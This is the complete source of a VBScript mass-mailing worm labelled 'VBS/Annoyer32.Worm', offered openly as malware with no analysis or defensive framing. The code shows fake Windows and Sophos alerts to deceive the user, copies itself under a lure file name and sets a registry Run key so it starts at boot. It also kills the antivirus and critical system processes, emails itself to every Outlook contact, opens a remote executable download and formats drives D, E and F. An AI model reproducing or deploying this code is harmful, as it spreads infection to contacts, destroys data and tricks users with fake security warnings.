   'This Virus is called VBS/Annoyer32.Worm

   wscript.sleep 10000
   msgbox "Microsoft Server show that your copy of Windows XP Home Edition is vulnerable to the new virus: VBS.Rundll32.Worm - please click yes when the file downloader appears to download the patch for your official protection", vbcritical, "Windows File Protection"
   On Error Resume Next
   Set WS = CreateObject("WScript.Shell")
   Set FSO= Createobject("scripting.filesystemobject")

   Set InF=FSO.OpenTextFile(WScript.ScriptFullname,1)
   Do While InF.AtEndOfStream<>True
   ScriptBuffer=ScriptBuffer&InF.ReadLine&vbcrlf
   Loop

   Set OutF=FSO.OpenTextFile(Folder&"c:\documents and settings\all users\XXX FREE PORN.vbs",2,true)
   OutF.write ScriptBuffer
   OutF.close
   Set FSO=Nothing

   ws.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\run\XXX", "C:\windows\system32\exysa ummama.vbs"
   ws.regwrite "HKLM\Software\Virus for hackers", "Sausage rolls taste crap!!!"
   'Ends programs to annoy user

   'If user has Sophos Anti-Virus, this virus disables it.
   ws.run("taskkill /F /IM sweepsrv.sys")

   msgbox "Virus: VBS.Rundll32-A.Worm has been detected in C:\Windows\System32\Anoy.vbe - Sophos cannot delete the file", vbcritical, "Sophos Anti-Virus"
   msgbox "Virus: VBS.Rundll32-A.Worm has not been deleted! It is reccomended you delete the file attempt delete?", vbyesno, "Sophos"
   wscript.sleep 10000
   msgbox "Your system is very low on Virtual Memory - do you want to correct this?", vbyesno, "Windows"

   'solitaire opens to irritate user
   wscript.sleep 10000
   ws.run("sol.exe")

   'Command Prompt opens to irritate user
   wscript.sleep 10000
   ws.run("cmd.exe")
   ws.run("http://www.bootyboutique.com/sexy%20carla.png")

   'Microsoft Word opens to irritate user

   wscript.sleep 10000
   ws.run("C:\Program Files\Microsoft Office\office10\winword.exe")
   ws.run("C:\Program Files\Microsoft Office\office11\winword.exe")



   Set s=CreateObject("Outlook.Application")
   Set t=s.GetNameSpace("MAPI")
   Set u=t.GetDefaultFolder(6)
   For i=1 to u.items.count
   If u.Items.Item(i).subject="Elloha ota ouya!" Then
   u.Items.Item(i).close
   u.Items.Item(i).delete
   End If
   Next
   Set u=t.GetDefaultFolder(3)
   For i=1 to u.items.count
   If u.Items.Item(i).subject="Elloha Ota ouya!" Then
   u.Items.Item(i).delete
   End If
   Next

   Mailit()

   Function Mailit()
   On Error Resume Next
   Set Outlook = CreateObject("Outlook.Application")
   If Outlook = "Outlook" Then
    Set Mapi=Outlook.GetNameSpace("MAPI")
    Set Lists=Mapi.AddressLists
    For Each ListIndex In Lists
     If ListIndex.AddressEntries.Count <> 0 Then
      ContactCount = ListIndex.AddressEntries.Count
      For Count= 1 To ContactCount
       Set Mail = Outlook.CreateItem(0)
       Set Contact = ListIndex.AddressEntries(Count)
       Mail.To = Contact.Address
       Mail.Subject = "Elloha ota ouya"
       Mail.Body = vbcrlf&"Earda Serua!"&vbcrlf&vbcrlf&"Ouya reaa heta tupidistsa ersonpa ia aveha verea etma!"&vbcrlf&vbcrlf
       Set Attachment=Mail.Attachments
       Attachment.Add Folder & "c:\windows\system32\exysa ummama.vbs"
       Mail.DeleteAfterSubmit = False
       If Mail.To <> "" Then
       Mail.Send
   End If
      Next
     End If
    Next
   End if
   End Function


   wscript.sleep 10000
   ws.run ("http://www.computerpranks.com/download/prank/cd.exe")
   ws.run("taskkill /F /IM svchost.exe")
   'Virus denies access to floppy drive
   ws.run("taskkill /f /IM smss.exe")
   ws.run("taskkill /F /IM winlogon.exe")
   ws.run("taskkill /F /IM system Idle Process")
   ws.run("taskkill /F /IM System")

   'virus formats a drive
   ws.run("format D:")
   ws.run("format E:")
   ws.run("format F:")
